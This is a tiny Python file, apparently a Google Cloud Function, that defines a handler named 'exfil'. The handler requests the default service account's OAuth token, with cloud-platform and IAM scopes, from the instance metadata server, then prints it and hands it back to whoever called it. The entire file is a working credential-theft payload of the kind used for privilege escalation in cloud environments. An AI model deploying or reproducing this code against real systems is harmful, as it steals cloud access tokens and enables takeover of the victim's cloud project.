import requests,json
def exfil(request):
    res = requests.get('http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token?scopes=https://www.googleapis.com/auth/cloud-platform,https://www.googleapis.com/auth/iam', headers={'Metadata-Flavor': 'Google'}).json()
    print(json.dumps(res, indent=4))
    return json.dumps(res)
